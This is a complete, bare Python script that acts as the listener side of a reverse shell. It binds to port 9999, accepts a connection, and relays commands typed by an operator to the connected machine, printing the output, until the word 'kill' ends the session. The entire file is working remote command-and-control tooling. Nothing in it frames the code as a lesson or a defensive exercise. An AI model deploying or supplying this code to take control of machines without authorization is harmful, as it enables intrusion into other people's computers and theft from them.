import socket
import sys


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("error occured while creating sockets", msg)
        
        
def bind():
    try:
        global host
        global port
        global s
        s.bind((host,port))
        print("binding the ip : {} on port : {}".format(host,str(port)))
        s.listen(5)
    except socket.error as msg:
        print("error occured while binding port ", msg)
        
        
def accept():
    conn ,addr = s.accept()
    print("connection estrablished for ip : {} on port : {}".format(addr[0], str(addr[1])))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "kill":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(20480), "utf-8")
            print(client_response,end="")


def main():
    create_socket()
    bind()
    accept()


main()
